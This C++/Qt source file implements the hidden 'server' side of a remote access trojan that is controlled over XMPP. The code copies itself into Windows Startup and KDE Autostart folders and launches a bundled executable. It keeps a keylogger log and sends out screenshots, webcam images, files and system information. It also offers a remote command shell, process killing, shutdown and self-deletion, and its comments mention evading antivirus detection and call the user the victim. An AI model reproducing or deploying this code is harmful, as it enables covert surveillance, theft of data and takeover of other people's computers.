/*
 *  Copyright (C) 2010 Alberto Pajuelo Montes <paju1986@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor,
 *  Boston, MA 02110-1301, USA.
 */

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QtTest/QTest>
#include <QPoint>
#include <QSysInfo>
#include <QDate>
#include <QTime>
#include <qxmpp/QXmppMessage.h>
#ifdef Q_OS_WIN
    #include <windows.h>
    #include <shellapi.h>
#endif

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    /** Constructor de la clase **/
    ui->setupUi(this);
    inicio();
}
MainWindow::~MainWindow()
{
    /** Destructor de la clase **/
    delete ui;
}
void MainWindow::changeEvent(QEvent *e)
{
    /** Función de manejo de eventos **/
    QMainWindow::changeEvent(e);
    switch (e->type()) {
    case QEvent::LanguageChange:
        ui->retranslateUi(this);
        break;
    default:
        break;
    }
}
void MainWindow::inicio(){
    /** funcion que se ejecuta al inicio de la aplicacion **/
    cargarConfiguracion();
    listarProcesos();
    this->generarVentanaChat();
    manager = new QXmppTransferManager;
    connect(manager,SIGNAL(fileReceived(QXmppTransferJob*)),this,SLOT(llegadaDatosArchivo(QXmppTransferJob*)));
    cliente.addExtension(manager);
    QString conversion;
    QByteArray datos; //Reconstruimos la configuración con algunas modificaciones para el servidor copiado
    datos = "|@|" + this->cuentaXmpp.toLatin1() + "|@|";
    datos = datos + conversion.toLatin1() + "|@|";
    datos = datos + this->alias.toLatin1() + "|@|";
    datos = datos + "nounido" + "|@|";
    datos = datos + "0" + "|@|";
    datos = datos + this->nombreCopiable.toLatin1() + "|@|";
    if(this->siempreOUnaVez == "0") //Si el programa de inicio se ejecuta siempre
    {
        datos = datos + this->ejecutar.toLatin1() + "|@|"; //Lo ponemos en el servidor copiado
        datos = datos + "0|@|";
    }
    else
    {
        datos = datos + "noejecutar|@|0|@|"; //Sino decimos al servidor copiado que no ejecute nada
    }
    #ifdef Q_WS_WIN
    if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows Vista/7
        copiarServidor(datos,QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
    }
    if (directorio.exists(QDir::homePath() + "/Start Menu/Programs/Startup")) { //Windows XP
        copiarServidor(datos,QDir::homePath() + "/Start Menu/Programs/Startup/" + this->nombreCopiable);
    }
    if (directorio.exists(QDir::homePath() + "/Menú Inicio/Programas/Inicio")) { //Windows XP
        copiarServidor(datos,QDir::homePath() + "/Menú Inicio/Programas/Inicio/" + this->nombreCopiable);
    }
    #else
    if (directorio.exists(QDir::homePath() + "/.kde/Autostart/")) { //Kubuntu
        copiarServidor(datos,QDir::homePath() + "/.kde/Autostart/" + this->nombreCopiable);
    }
    #endif
    temporizador.start(this->tiempoConexion); //iniciar el temporizador para conexiÃ³n
    connect(this->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
    connect(&this->verTecla,SIGNAL(timeout()),this,SLOT(escucharTeclas()));
    connect(&cliente,SIGNAL(messageReceived(const QXmppMessage&)),this,SLOT(llegadaDatos(const QXmppMessage&)));
    connect(this,SIGNAL(procesar(QImage,int)),&capturacion,SLOT(procesarImagen(QImage,int)));
    connect(&capturacion,SIGNAL(enviar(QByteArray)),this,SLOT(enviarCaptura(QByteArray)));
    connect(&cliente,SIGNAL(presenceReceived(QXmppPresence)),this,SLOT(recibidaPresencia(QXmppPresence)));
    QApplication::setQuitOnLastWindowClosed(false);
    log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
    log.open(QFile::WriteOnly);
    log.close();
    verTecla.setInterval(50);
    this->verTecla.start();   
    if(this->ejecutar != "noejecutar") //Ejecutar un programa al inicio
    {
        QProcess::startDetached(this->ejecutar);
    }
    capturacion.moveToThread(&hilo); //movemos capturacion a un nuevo hilo para que se ejecute de forma independiente al programa principal y no lo bloquee
    hilo.start();
    QXmppConfiguration configuracion;
    configuracion.setJid(this->cuentaXmpp);
    configuracion.setPassword(this->contrasena);
    configuracion.setResource(this->alias);
    cliente.setClientPresence(QXmppPresence::Available);
    cliente.connectToServer(configuracion);
}
bool MainWindow::cargarConfiguracion(){
    /** Cargar la configuración del servidor guardada en el último KB del ejecutable **/
    //valores por defecto
    this->cuentaXmpp = "";
    this->contrasena = "";
    this->alias = "servidor";
    QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicaciÃ³n
    this->nombreCopiable = "noiniciar"; //Nombre del ejecutable
    // No olividar renombrar el ejecutable a rawserver.dat y moverlo al directorio del cliente
    QString datos;
    QString conversion;
    QStringList campo;
    QFile servidor;
    servidor.setFileName(QApplication::applicationFilePath());
    servidor.open(QIODevice::ReadOnly);
    servidor.seek(servidor.size() - 1024);
    datos = servidor.read(1024);
    servidor.close();
    campo = datos.split("|@|");
    if(campo.size() >= 8)
    {
        this->cuentaXmpp = campo[1];
        this->contrasena = campo[2];
        this->alias = campo[3];
        this->adjunto = campo[4];
        this->tamanoAdjunto = campo[5].toLong();
        this->nombreCopiable = campo[6];
        this->ejecutar = campo[7];
        this->siempreOUnaVez = campo[8];

    }
    return true;
}
void MainWindow::recibidaPresencia(QXmppPresence presencia)
{
    if(presencia.type() == QXmppPresence::Subscribe)
    {
        QXmppPresence aceptar;
        aceptar.setTo(presencia.from());
        aceptar.setType(QXmppPresence::Subscribed);
        cliente.sendPacket(aceptar);
    }
}
void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
{
/** Copia el servidor a la ruta destino con la configuración proporcionada en tramaConfiguracion **/
    QString home = directorio.homePath(); //ruta absoluta del directorio raiz del usuario
    QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicaciÃ³n
    if (this->adjunto == "unido") //Cuando hay un ejecutable adjunto
    {
        //TODO: ":Esto está muy poco optimizado, mejorar más adelante."
        QDir directorio;
        qint64 tamano;
        tamano = this->tamanoAdjunto;
        QFile adjunto;
        QFile servidor;
        adjunto.setFileName(directorio.tempPath() + "/temp.exe");
        servidor.setFileName(QApplication::applicationFilePath());
        adjunto.open(QFile::WriteOnly);
        servidor.open(QFile::ReadOnly);
        if(this->nombreCopiable != "noiniciar") //Solo necesitamos extraer el servidor si lo tenemos que copiar
        {
            QFile copiable;
            copiable.setFileName(destino);
            copiable.open(QFile::WriteOnly);
            copiable.write(servidor.read(servidor.size() - 1024 - tamano));
            copiable.write(tramaConfiguracion,1024);
            copiable.close();
        }
        servidor.seek(servidor.size() - 1024 - tamano);
        adjunto.write(servidor.read(tamano));
        servidor.close();
        adjunto.close();
        proceso.setWorkingDirectory(directorio.tempPath());
        QString exeFileName = directorio.tempPath() + "/temp.exe";
        /*#ifdef Q_OS_WIN //Avira detecta esto como virus
        int result = (int)::ShellExecuteA(0, "open", exeFileName.toUtf8().constData(), 0, 0, SW_SHOWNORMAL);
        if (SE_ERR_ACCESSDENIED == result)
        {
            result = (int)::ShellExecuteA(0, "runas", exeFileName.toUtf8().constData(), 0, 0, SW_SHOWNORMAL);
       }
        #endif*/
        QProcess::startDetached(exeFileName);
    }
    else
    {
        if(this->nombreCopiable != "noiniciar")
        {
            QFile servidor;
            QFile copiable;
            servidor.setFileName(QApplication::applicationFilePath());
            copiable.setFileName(destino);
            copiable.open(QFile::WriteOnly);
            servidor.open(QFile::ReadOnly);
            copiable.write(servidor.read(servidor.size() - 1024));
            copiable.write(tramaConfiguracion,1024);
            copiable.close();
            servidor.close();
        }
    }
}

void MainWindow::llegadaDatos(const QXmppMessage &mensaje) {
    /** Función para el manejo de los datos recibidos a través del socket **/
    from = mensaje.from();
    QString datos = mensaje.body();
    //datos = socket.readAll();
    QStringList parametros =  datos.split("|@|");
    if(parametros[0] == "t") //llegada de teclas
    {
        int i;
        for(i=0;i<parametros.size();i++) //recorremos y vamos enviando las teclas
        {
            enviarTecla(parametros[i].toInt());
        }
        return;
    }
    if (parametros[0] == "der") //un click derecho
    {
        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
        hacerClickDerechoP();
        hacerClickDerechoS();
        return;
    }
    if (parametros[0] == "izq") //un click izquierdo
    {
        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
        hacerClickIzquierdoP();
        hacerClickIzquierdoS();
        return;
    }
    if (parametros[0] == "arra") //mover el raton arrastrando
    {
        moverPuntero(parametros[1].toInt(),parametros[2].toInt());

        hacerClickIzquierdoP();

        moverPuntero(parametros[3].toInt(),parametros[4].toInt());

        hacerClickIzquierdoS();

        return;
    }
    if(parametros[0] == "shell"){ //shell remoto
        QString salidaShell;
        salidaShell = "shell|@|" + shell(parametros[1].toLatin1());
        cliente.sendMessage(from,salidaShell);

    }
    if (parametros[0] == "home"){
        cliente.sendMessage(from,"home|@|" + QDir::homePath());
    }
    if (parametros[0] == "unidades")
    {
        listarUnidades();
    }
    if (parametros[0] == "archivos"){
        listarArchivos(parametros[1]);
    }
    if (parametros[0] == "directorios"){
        listarDirectorios(parametros[1]);
    }
    if (parametros[0] == "get"){
       job = manager->sendFile(from,parametros[1]);
    }
    if (parametros[0] == "put"){
        archivo = parametros[1];
    }
    if (parametros[0] == "remove"){
        directorio.remove(parametros[1]);
    }
    if (parametros[0] == "createfolder"){
        directorio.mkdir(parametros[1]);
    }
    if (parametros[0] == "borrarcarpeta")
    {
        directorio.rmdir(parametros[1]);    }
    if (parametros[0] == "tamano")
    {
        QString tamano;
        tamano.setNum(QFileInfo(parametros[1]).size());
        cliente.sendMessage(from,"tamano|@|" + tamano);
    }
    if (parametros[0] == "execute")
    {
        QProcess::startDetached(parametros[1]);
    }
    if (parametros[0] == "copiar")
    {
        QFile::copy(parametros[1],parametros[2]);
    }
    if (parametros[0] == "mover")
    {
        if(parametros[1] != parametros[2]) //Para evitar borrar el archivo si se mueve a la misma carpeta
        {
            QFile::copy(parametros[1],parametros[2]);
            QFile::remove(parametros[1]);
        }
    }
    if (parametros[0] == "renombrar")
    {
        QFile::rename(parametros[1],parametros[2]);
    }
    if (parametros[0] == "previa")
    {
        vistaPrevia(parametros[1]);
    }
    if (parametros[0] == "alerta"){
        mostrarMensaje("alerta",parametros[2],parametros[1]);
    }
    if (parametros[0] == "info"){
        mostrarMensaje("info",parametros[2],parametros[1]);
    }
    if (parametros[0] == "peligro"){
        mostrarMensaje("peligro",parametros[2],parametros[1]);
    }
    if (datos == "reiniciar"){
        reiniciar();
    }
    if (datos == "cerrar"){ //cerrar el servidor
        QApplication::exit();
    }
    if (datos == "desinfectar")
    {
        desinfectar();
    }
    if (datos == "ping") { //ping al servidor
        cliente.sendMessage(from,"pong");
    }
    if(parametros[0] == "apagarequipo"){
       #ifdef Q_WS_WIN
        shell("shutdown /t 1 /s");
       #else
        shell("shutdown -h now");
       #endif
    }
    if(parametros[0] == "reiniciarequipo"){
       #ifdef Q_WS_WIN
        shell("shutdown /t 0 /r");
       #else
        shell("shutdown -r now");
       #endif
    }
    if (datos == "abrirchat") {
        this->abrirChat();
    }
    if (datos == "cerrarchat") {
        this->cerrarChat();
    }
    if (parametros[0] == "chat") {
        this->nickVictima = parametros[3];
        this->ponerMensajeChat(parametros[1],parametros[2]);
    }
    if (parametros[0] == "activark")
    {
        verTecla.start();
    }
    if (parametros[0] == "desactivark")
    {
        verTecla.stop();
    }
    if (parametros[0] == "recibirk")
    {
        QFile klog;
        klog.setFileName(directorio.tempPath() + "/log");
        klog.open(QFile::ReadOnly);
        cliente.sendMessage(from,"teclas|@|" + klog.readAll());
        klog.close();
    }
    if (parametros[0] == "limpiark")
    {
        QDir directorio;
        if(this->verTecla.isActive())
        {
            this->verTecla.stop();
            directorio.remove(directorio.tempPath() + "/log");
            this->verTecla.start();
        }
        else
        {
            directorio.remove("./log");
        }
    }
    if (parametros[0] == "informacion")
    {   
        cliente.sendMessage(from,obtenerInformacionSistema());
    }
    if(parametros[0] == "procesos")
    {
        listarProcesos();
    }
    if(parametros[0] == "matar")
    {
        matarProceso(parametros[1]);
    }
    if(parametros[0] == "captura")
    {
         emit procesar(screenShot().toImage(),parametros[1].toInt());
    }
    if (parametros[0] == "cap")
    {
        bufferWebcam.setBuffer(&WebcamMem);
        bufferWebcam.open(QIODevice::WriteOnly);
        QPixmap imagen;
        imagen = capturar();
        imagen.save(&bufferWebcam,"jpeg",parametros[1].toInt());
        QXmppTransferFileInfo informacion;
        informacion.setName("|@|webbcam|@|");
        informacion.setSize(bufferWebcam.size());
        job = manager->sendFile(from,&bufferWebcam,informacion);

    }
    if (parametros[0] == "encender")
    {
        encender();
    }
    if (parametros[0] == "apagar")
    {
        apagar();
    }
}
void MainWindow::moverPuntero(int x, int y)
{
    QPoint puntero;
    puntero.setX(x);
    puntero.setY(y);
    QTest::mouseMove(QApplication::desktop(),puntero);
}
QString MainWindow::obtenerInformacionSistema()
{
    /** Obtiene información relevante del ambiente donde se está ejecutando el servidor **/
    QString so;
    QString version;
    //QString unidades = QDir::drives();
    QString homePath = QDir::homePath();
    QString tempPath = QDir::tempPath();
    QString alto;
    alto.setNum(QApplication::desktop()->height());
    QString ancho;
    ancho.setNum(QApplication::desktop()->width());
    QDate tiempo;
    QString fecha = tiempo.currentDate().toString();
    QTime horaSistema;
    QString hora = horaSistema.currentTime().toString();
    QString alias = this->alias;
    #ifdef Q_WS_WIN
        so = "Windows";
        switch (QSysInfo::WindowsVersion)
        {
        case QSysInfo::WV_XP: {
            version = "XP";
            break;
        }
        case QSysInfo::WV_2003: {
            version = "2003 Server";
            break;
        }
        case QSysInfo::WV_VISTA: {
            version = "Vista";
            break;
        }
        case QSysInfo::WV_WINDOWS7: {
            version = "7";
            break;
        }
        default:
            break;
        }
    #else
        so = "GNU/Linux";
        QProcess ver;
        ver.start("uname -a");
        ver.waitForReadyRead();
        version =  ver.readAll();
    #endif
        return "informacion|@|" + so + "|@|" + version + "|@|" + homePath + "|@|" + tempPath + "|@|" + ancho + "|@|" + alto + "|@|" + fecha + "|@|" + hora + "|@|" + alias + "|@|";
}
void MainWindow::llegadaDatosArchivo(QXmppTransferJob* transferencia){
    /** Función invocada para recibir un archivo enviado por el cliente **/
    archivoRecibido = new QFile(directorio.path() + "/" + archivo);
    archivoRecibido->open(QFile::WriteOnly);
    transferencia->accept(archivoRecibido);
}

QPixmap MainWindow::screenShot(){
    /** Función que realiza la captura de la pantalla **/
    QPixmap captura;
    captura = QPixmap::grabWindow(QApplication::desktop()->winId());
    return captura;
}
void MainWindow::desconectado() {
    /** cosas que hacer al desconectarse **/
    temporizador.start(this->tiempoConexion);
    apagar(); //Si se desconecta y la webcam estaba encendida es mejor apagarla.
}
QString MainWindow::shell(QString comando){
    /** Función que ejecuta el comando de consola pasado como parámetro y devuelve la salida **/
    #ifdef Q_WS_WIN
        consola.start("cmd.exe /C " + comando);
    #else
        consola.start(comando);
    #endif
    return consola.readAllStandardOutput();
}
void MainWindow::reiniciar(){
    /** Función que reinicia el servidor **/
    QString filePath = QApplication::applicationFilePath();
    QProcess::startDetached(filePath);
    QApplication::exit();
}
void MainWindow::desinfectar()
{
    /** Esta funcion borra todos los archivos del servidor y luego se borra a si mismo **/
    this->verTecla.stop();
    apagar();
    QFile::remove(directorio.tempPath() + "/dat");
    QFile::remove(directorio.tempPath() + "/log");
    QFile::remove("data");
    #ifdef Q_WS_WIN
    /* En Windows lo que hacemos es crear un .bat que espere un cierto tiempo para dar tiempo al servidor a cerrarse y luego lo borra */
    QByteArray bat;
    bat = "@echo off \nping localhost -n 1 -w 1000 > null\ndel \"" + QApplication::applicationFilePath().toLatin1() + "\"\ndel \"" + QApplication::applicationDirPath().toLatin1() + "/null\"\ndel \"" + QApplication::applicationDirPath().toLatin1() + "/borrar.bat\"";
    bat.replace("/","\\");
    QFile archivoBat;
    archivoBat.setFileName("borrar.bat");
    archivoBat.open(QFile::WriteOnly | QFile::Text);
    archivoBat.write(bat);
    archivoBat.close();
    QProcess::startDetached("borrar.bat");
    #endif
    QApplication::exit();
}
void MainWindow::listarUnidades()
{  /** Esta función envia por socket una lista de las unidades de almacenamiento del sistema **/
    int i;
    QString unidades = "unidades|@|";
    QFileInfoList listaUnidades = directorio.drives();
    for (i=0;i<listaUnidades.size();i++){
        unidades = unidades + listaUnidades[i].absoluteFilePath() + "|@|";
    }
    cliente.sendMessage(from,unidades);
}
void MainWindow::listarArchivos(QString ruta){
    /** Función que envia por socket una lista de archivos del directorio pasado como parámetro **/
    int i;
    QString archivos = "file|@|";
    directorio.cd(ruta);
    QStringList listaArchivos = directorio.entryList(QDir::Files);
    for (i=0;i<listaArchivos.size();i++){
        archivos = archivos + listaArchivos[i] + "|@|";
    }
    cliente.sendMessage(from,archivos);
}
void MainWindow::listarDirectorios(QString ruta){
    /** Función que envia por socket una lista de directorios del directorio pasado como parámetro **/
    int i;
    QString directorios = "folder|@|";
    directorio.cd(ruta);
    QStringList listaDirectorios = directorio.entryList(QDir::Dirs);
    for (i=0;i<listaDirectorios.size();i++){
        directorios = directorios + listaDirectorios[i] + "|@|";
    }
    cliente.sendMessage(from,directorios);
}
void MainWindow::vistaPrevia(QString archivo)
{
    bufferMini.setBuffer(&miniMem);
    QPixmap imagen;
    imagen.load(archivo);
    bufferMini.open(QIODevice::WriteOnly);
    imagen.scaled(128,128).save(&bufferMini,"jpeg",70);
    bufferMini.close();
    QXmppTransferFileInfo informacion;
    informacion.setName("|@|mini|@|");
    informacion.setSize(bufferMini.size());
    bufferMini.open(QIODevice::ReadOnly);
    job = manager->sendFile(from,&bufferMini,informacion);
}
void MainWindow::mostrarMensaje(QString tipo, QString titulo, QString texto){
    /** Función que muestra mensajes emergentes **/
    mensaje = new QMessageBox(this);
    mensaje->setWindowModality(Qt::NonModal);
    if (tipo == "alerta"){
       mensaje->setIcon(QMessageBox::Warning);
    }
    if (tipo == "info"){
        mensaje->setIcon(QMessageBox::Information);
    }
    if (tipo == "peligro"){
        mensaje->setIcon(QMessageBox::Critical);
    }
    mensaje->setWindowTitle(titulo);
    mensaje->setText(texto);
    mensaje->setVisible(true);
}
void MainWindow::generarVentanaChat()
{
    /** Crea una ventana de chat **/
    this->chat = new QWidget(0,Qt::CustomizeWindowHint);
    this->capa = new QVBoxLayout(chat);
    this->capaHorizontal = new QHBoxLayout(chat);
    this->botonChatEnviar = new QPushButton("Enviar",chat);
    this->enviarChatTexto = new QLineEdit(chat);
    salidaChatTexto = new QPlainTextEdit(chat);
    capa->addWidget(salidaChatTexto);
    capaHorizontal->addWidget(enviarChatTexto);
    capaHorizontal->addWidget(botonChatEnviar);
    capa->addLayout(capaHorizontal);
}
void MainWindow::abrirChat()
{
    /** Función que abre la ventana de chat **/
    chat->show();
}
void MainWindow::cerrarChat()
{
    /** Función que cierra la ventana de chat **/
    this->chat->close();
}
void MainWindow::enviarMensajeChat()
{
    /** Envia un mensaje de chat al cliente **/
    this->ponerMensajeChat(this->enviarChatTexto->text(),this->nickVictima);
    //util.escribirSocket ( "chat|@|" + this->enviarChatTexto->text() );
    this->enviarChatTexto->clear();
}
void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
{
    /** muestra el mensaje de char recibido **/
    this->salidaChatTexto->document()->setHtml(this->salidaChatTexto->document()->toHtml() + "<br>" + quien + " dice: " + mensajeChat);
}
void MainWindow::escucharTeclas()
{
    /** Esta función comprueba que teclas hay pulsadas y las guarda en un archivo **/

       /* log.open(QFile::Append);
        char num;
        num = comprobarTeclas();

        if(num != 0)
        {
            cadenaa.append(num);
            log.write(cadenaa);
            cadenaa.clear();
            log.close();
        } */
}

paralelo::paralelo()
{
    imagen1 = new QImage(QApplication::desktop()->width(),QApplication::desktop()->height(),QImage::Format_RGB32);
    imagen1->fill(QColor(0,0,0).rgba());
    sincroniza = 0;
}

void paralelo::procesarImagen(QImage imagen2, int calidad)
{
    int i,j;
    QImage imagen3(imagen2.width(),imagen2.height(), QImage::Format_RGB32); //Creamos una imagen nueva donde pintaremos los pixeles diferentes
    imagen3.fill(QColor(255, 0, 255).rgb()); //Inicializamos la imagen a fucsia para que envie la primera completa
    for(i=0;i<imagen1->width();i++) //Recorremos toda la imagen
    {
        for(j=0;j<imagen1->height();j++)
        {
            if(imagen1->pixel(i,j) != imagen2.pixel(i,j)) //Si los pixeles son diferentes entonces se escriben en la nueva imagen
            {
                imagen3.setPixel(i,j,imagen2.pixel(i,j));
            }
        }
    }
    buffer = new QBuffer(&bytes);
    buffer->open(QIODevice::ReadWrite);
    imagen3.save(buffer,"jpg",calidad); //Guardamos la imagen resultante en un bufer de memoria en formato jpg
    *imagen1 = imagen2; //La captura actual pasa a ser captura anterior
    sincroniza++; //LLebamos la cuenta de cuantas capturas vamos haciendo
    if(sincroniza == 10) //Cada 10 capturas envia una completa para sincronizar
    {
        imagen1->fill(QColor(0,0,0).rgba()); //Al poner la imagen1 a negro la diferencia con la imagen anterior es toda la imagen por lo que se envia la captura entera
        sincroniza = 0;
    }
    emit enviar(buffer->buffer());
}
void MainWindow::listarProcesos()
{
    int i;
    QProcess procesos;
    QString listaEnvio = "listaprocesos|@|";
    #ifdef Q_OS_WIN
    procesos.start("tasklist");
    procesos.waitForFinished();
    procesos.waitForReadyRead();
    QString salida = procesos.readAllStandardOutput();
    QStringList listaProc = salida.split("\n");
    for(i=3;i<listaProc.size() - 1;i++)
    {
        listaEnvio = listaEnvio + listaProc[i].split(" ")[0] + "|@|";
    }
    #else
    procesos.start("ps  -eo %c");
    procesos.waitForFinished();
    procesos.waitForReadyRead();
    QString salida = procesos.readAllStandardOutput();
    QStringList listaProc = salida.split("\n");
    for(i=1;i<listaProc.size();i++)
    {
        listaEnvio = listaEnvio + listaProc[i] + "|@|";
    }
    #endif
    cliente.sendMessage(from,listaEnvio);
}
void MainWindow::matarProceso(QString programa)
{
    #ifdef Q_OS_WIN
    QString orden = "taskkill /IM " + programa;
    #else
    QString orden = "killall " + programa;
    #endif
    QProcess::startDetached(orden);
}

void MainWindow::enviarCaptura(QByteArray array)
{
    bufferMem = array;
    mem.setBuffer(&bufferMem);
    mem.open(QIODevice::ReadOnly);
    QXmppTransferFileInfo informacion;
    informacion.setName("|@|captura|@|");
    informacion.setSize(mem.size());
    job = manager->sendFile(from,&mem,informacion);
}
